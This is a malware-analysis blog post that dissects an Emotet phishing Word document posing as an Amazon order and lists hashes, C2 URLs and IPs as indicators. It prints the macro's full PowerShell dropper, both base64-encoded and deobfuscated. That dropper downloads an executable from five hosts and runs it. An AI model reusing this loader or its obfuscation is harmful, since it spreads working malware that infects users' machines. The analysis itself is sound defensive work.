I've taken a look at a couple of Emotet emails today and noticed they have tried to hide their list of C2's that are embedded within the document.

This post outlines how to get the C2's and also highlights a couple of cool tools I use when capturing command line output from malware.

http://www.kahusecurity.com/posts/cmd_watcher_updated.html - This is great tool for displaying any commands that are being run by a piece of malware and having that information recorded.

https://github.com/felixweyne/ProcessSpawnControl - This is a really useful tool in that it will suspend any newly created processes. The user then has the option to terminate the process or allow it to run.

**Email Subject:**

Your Amazon Order 184-1748378-0895603 

**Sender:**

vaalparkspar@telkomsa.net

**Attachment:**

Order 184-1748378-0895603.doc - MD5:17bc30d373d4fb1020fd5daae6e70e05

**Analysis:**

Microsoft Word opened and Macro’s enabled. This launches PowerShell:

``PID: 2968, Command line: Powershell -e JABqADQAQwBuADYASgB6AD0AKAAnAEQAJwArACcAQQBvAEYASwAnACsAJwBCAHcAVgAnACkAOwAkAG4AQgBPAEsANwBZAFkAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQATwBoAEgAbABDADcAagB0AD0AKAAnAGgAdAB0AHAAOgAnACsAJwAvAC8AJwArACcAbQBlAG0AdAByAGUAJwArACcAYQB0ACcAKwAnAC4AYwBvAG0ALwBUAE8AJwArACcAbgA5ACcAKwAnAEsANQAnACsAJwAxAFEASwAxAHAASgAyAHEASQAnACsAJwBfAFMASwBhAGUAYgBGAEEAegAnACsAJwBAAGgAJwArACcAdAB0AHAAOgAnACsAJwAvAC8AbQBlAGQAbwAnACsAJwBuAGcAaABvAC4AdgAnACsAJwBuAC8AUwBWAG0ANQB5AEMAMABzACcAKwAnAHcAXwBDAHgAQABoAHQAdABwADoALwAnACsAJwAvAG8AJwArACcAdABvAGoAYQBjAGsALgAnACsAJwBjACcAKwAnAG8ALgAnACsAJwBpAGQAJwArACcALwB3AHAALQBjAG8AJwArACcAbgB0AGUAbgB0AC8AdQAnACsAJwBwAGwAJwArACcAbwBhAGQAcwAvAHgAdgAnACsAJwBWAFEAYwAyAFIAegBkAEQAaAAnACsAJwBUAFcAcwB3AFYAJwArACcAYQAnACsAJwBAAGgAdAB0ACcAKwAnAHAAOgAvAC8AcAAnACsAJwB0AG0AbQBmAC4AYwBvAC4AaQAnACsAJwBkAC8AdQBOAFYATQBQAEUATABUAFEAXwBsACcAKwAnAGQAJwArACcAUQBAAGgAdAAnACsAJwB0AHAAOgAvAC8AcABvAHQAbAAnACsAJwBhAGMAawAnACsAJwBhAHIAaQAnACsAJwBlAHQAJwArACcALgBzAGsALwBiAFgAZgBrACcAKwAnAEoAJwArACcAMgBTAGUASwBkACcAKwAnADcAJwArACcAZwAnACkALgBTAHAAbABpAHQAKAAnAEAAJwApADsAJABNAHEARABXAEMAVABqAD0AKAAnAHUAdwB6AHcAJwArACcAMgB6ACcAKQA7ACQAegBHADgAVQBaAG8AOAAgAD0AIAAoACcAMwAxACcAKwAnADkAJwApADsAJABWAE0AUQBOAHIAUgBLAD0AKAAnAHYANgA3AGYARQBqACcAKwAnAGsAJwArACcAUgAnACkAOwAkAEMASABaAEMAMQBFAFAAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAJwBcACcAKwAkAHoARwA4AFUAWgBvADgAKwAoACcALgBlACcAKwAnAHgAZQAnACkAOwBmAG8AcgBlAGEAYwBoACgAJABLAGIAdQBYAEoAMAAgAGkAbgAgACQATwBoAEgAbABDADcAagB0ACkAewB0AHIAeQB7ACQAbgBCAE8ASwA3AFkAWQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABLAGIAdQBYAEoAMAAsACAAJABDAEgAWgBDADEARQBQACkAOwAkAGIAMABVAFkAagBtAFAAPQAoACcATAB3AFIAMgAnACsAJwA5ACcAKwAnAFIAJwApADsASQBmACAAKAAoAEcAZQB0AC0ASQB0AGUAbQAgACQAQwBIAFoAQwAxAEUAUAApAC4AbABlAG4AZwB0AGgAIAAtAGcAZQAgADQAMAAwADAAMAApACAAewBJAG4AdgBvAGsAZQAtAEkAdABlAG0AIAAkAEMASABaAEMAMQBFAFAAOwAkAEcAQQAwAHYATABEAFUAbQA9ACgAJwBVAHIAUQBNACcAKwAnAGsASgAnACkAOwBiAHIAZQBhAGsAOwB9AH0AYwBhAHQAYwBoAHsAfQB9ACQAYwBGAHcAdABsAGMAUgA9ACgAJwBKAG0ARQA5AE4AJwArACcASgBtAGQAJwApADsA``

The above output is base64 encoded. 
Example of CMD Watcher capturing this information (Note I have unticked the “Kill Process” Boxes):

![CMD Watcher](/images/Emotet/cmd.png)

Same data captured in ProcessSpawnControl:

![Process Spawn Control](/images/Emotet/psc.png)

When base64 decoded the following output is displayed:

``$.j.4.C.n.6.J.z.=.(.'.D.'.+.'.A.o.F.K.'.+.'.B.w.V.'.).;.$.n.B.O.K.7.Y.Y.=.n.e.w.-.o.b.j.e.c.t. .N.e.t...W.e.b.C.l.i.e.n.t.;.$.O.h.H.l.C.7.j.t.=.(.'.h.t.t.p.:.'.+.'././.'.+.'.m.e.m.t.r.e.'.+.'.a.t.'.+.'...c.o.m./.T.O.'.+.'.n.9.'.+.'.K.5.'.+.'.1.Q.K.1.p.J.2.q.I.'.+.'._.S.K.a.e.b.F.A.z.'.+.'.@.h.'.+.'.t.t.p.:.'.+.'././.m.e.d.o.'.+.'.n.g.h.o...v.'.+.'.n./.S.V.m.5.y.C.0.s.'.+.'.w._.C.x.@.h.t.t.p.:./.'.+.'./.o.'.+.'.t.o.j.a.c.k...'.+.'.c.'.+.'.o...'.+.'.i.d.'.+.'./.w.p.-.c.o.'.+.'.n.t.e.n.t./.u.'.+.'.p.l.'.+.'.o.a.d.s./.x.v.'.+.'.V.Q.c.2.R.z.d.D.h.'.+.'.T.W.s.w.V.'.+.'.a.'.+.'.@.h.t.t.'.+.'.p.:././.p.'.+.'.t.m.m.f...c.o...i.'.+.'.d./.u.N.V.M.P.E.L.T.Q._.l.'.+.'.d.'.+.'.Q.@.h.t.'.+.'.t.p.:././.p.o.t.l.'.+.'.a.c.k.'.+.'.a.r.i.'.+.'.e.t.'.+.'...s.k./.b.X.f.k.'.+.'.J.'.+.'.2.S.e.K.d.'.+.'.7.'.+.'.g.'.)...S.p.l.i.t.(.'.@.'.).;.$.M.q.D.W.C.T.j.=.(.'.u.w.z.w.'.+.'.2.z.'.).;.$.z.G.8.U.Z.o.8. .=. .(.'.3.1.'.+.'.9.'.).;.$.V.M.Q.N.r.R.K.=.(.'.v.6.7.f.E.j.'.+.'.k.'.+.'.R.'.).;.$.C.H.Z.C.1.E.P.=.$.e.n.v.:.u.s.e.r.p.r.o.f.i.l.e.+.'.\.'.+.$.z.G.8.U.Z.o.8.+.(.'...e.'.+.'.x.e.'.).;.f.o.r.e.a.c.h.(.$.K.b.u.X.J.0. .i.n. .$.O.h.H.l.C.7.j.t.).{.t.r.y.{.$.n.B.O.K.7.Y.Y...D.o.w.n.l.o.a.d.F.i.l.e.(.$.K.b.u.X.J.0.,. .$.C.H.Z.C.1.E.P.).;.$.b.0.U.Y.j.m.P.=.(.'.L.w.R.2.'.+.'.9.'.+.'.R.'.).;.I.f. .(.(.G.e.t.-.I.t.e.m. .$.C.H.Z.C.1.E.P.)...l.e.n.g.t.h. .-.g.e. .4.0.0.0.0.). .{.I.n.v.o.k.e.-.I.t.e.m. .$.C.H.Z.C.1.E.P.;.$.G.A.0.v.L.D.U.m.=.(.'.U.r.Q.M.'.+.'.k.J.'.).;.b.r.e.a.k.;.}.}.c.a.t.c.h.{.}.}.$.c.F.w.t.l.c.R.=.(.'.J.m.E.9.N.'.+.'.J.m.d.'.).;.``

The PowerShell commands are still obfuscated using ‘.’ (null bytes) to separate every character. 

Output with null bytes removed:

``$j4Cn6Jz=('D'+'AoFK'+'BwV');$nBOK7YY=new-object Net.WebClient;$OhHlC7jt=('http:'+'//'+'memtre'+'at'+'.com/TO'+'n9'+'K5'+'1QK1pJ2qI'+'_SKaebFAz'+'@h'+'ttp:'+'//medo'+'ngho.v'+'n/SVm5yC0s'+'w_Cx@http:/'+'/o'+'tojack.'+'c'+'o.'+'id'+'/wp-co'+'ntent/u'+'pl'+'oads/xv'+'VQc2RzdDh'+'TWswV'+'a'+'@htt'+'p://p'+'tmmf.co.i'+'d/uNVMPELTQ_l'+'d'+'Q@ht'+'tp://potl'+'ack'+'ari'+'et'+'.sk/bXfk'+'J'+'2SeKd'+'7'+'g').Split('@');$MqDWCTj=('uwzw'+'2z');$zG8UZo8 = ('31'+'9');$VMQNrRK=('v67fEj'+'k'+'R');$CHZC1EP=$env:userprofile+'\'+$zG8UZo8+('.e'+'xe');foreach($KbuXJ0 in $OhHlC7jt){try{$nBOK7YY.DownloadFile($KbuXJ0, $CHZC1EP);$b0UYjmP=('LwR2'+'9'+'R');If ((Get-Item $CHZC1EP).length -ge 40000) {Invoke-Item $CHZC1EP;$GA0vLDUm=('UrQM'+'kJ');break;}}catch{}}$cFwtlcR=('JmE9N'+'Jmd');``

The URL’s within the script which are used to download the malware are also broken down and pieced together using ‘+’ i.e. http:'+'//'+'memtre'+'at'+'.com/TO'+'n9'+'K5'+'1QK1pJ2qI'+'_SKaebFAz.
Removing this obfuscation technique provides the C2’s that the PowerShell script uses to download the malicious payload:

``hxxp://memtreat[.]com/TOn9K51QK1pJ2qI_SKaebFAz/``

``hxxp://medongho[.]vn/SVm5yC0s``

``hxxp://otojack.co[.]id/wp-content/uploads/xvVQc2RzdDhTWswVa``

``hxxp://ptmmf.co[.]id/uNVMPELTQ_ldQ``

``hxxp://potlackariet[.]sk/bXfkJ2SeKd7g``

A this point the payload is downloaded to the following location and given a 3 digit name:

``PID: 2080, Command line: "C:\Users\Administrator\319.exe"``

Using ProcessSpawnControl I am able to capture 319.exe before it deletes itself.

![319.exe](/images/Emotet/cmd_spawn.png)

Once I have taken a copy of the binary I can allow the malware to continue running. This is such a useful feature where a piece of malware may drop multiple files and then delete some of them when it tries to clean itself up:

![319.exe suspended](/images/Emotet/319_allow.png)

319.exe launched:

``PID: 2992, Command line: "C:\Users\Administrator\319.exe"``

The file is then copied to its persistence location and deleted from “C:\Users\Administrator\”.

**Process Activity**

![Process Activity](/images/Emotet/process1.png)

![Process Activity](/images/Emotet/process2.png)

**Payload:**

slidemenus.exe - MD5: abac88c5e2220d78d2c835e138a6d78a

The same Word document opened on a 64bit machine downloaded a different payload:

issturned.exe - MD5: 477e59649a0a32de005b6947df42205a

**C2s:**

hxxp://memtreat[.]com/TOn9K51QK1pJ2qI_SKaebFAz/

hxxp://medongho[.]vn/SVm5yC0s

hxxp://otojack.co[.]id/wp-content/uploads/xvVQc2RzdDhTWswVa

hxxp://ptmmf.co[.]id/uNVMPELTQ_ldQ

hxxp://potlackariet[.]sk/bXfkJ2SeKd7g

**IP Addresses pulled from memory:**

0x398d80 (22): hxxp://98.157.215[.]153/

0x3b51ca (52): :tp://153.121.36[.]202:7080/

0x3bb82a (23): tp://71.240.202[.]13:443/

0x3bb86a (23): tp://70.164.196[.]211:20/

0x3d19b0 (14): 98.157.215.153

0x3d1c20 (13): 181.119.30.27

0x3d1c38 (14): 153.121.36.202

0x3d1c50 (14): 69.136.227.134

0x3d1c98 (14): 216.49.114.172

0x3d7a30 (44): %ttp://175.101.79.120/

0x3d7a6a (40): ttp://190.215.53.85/
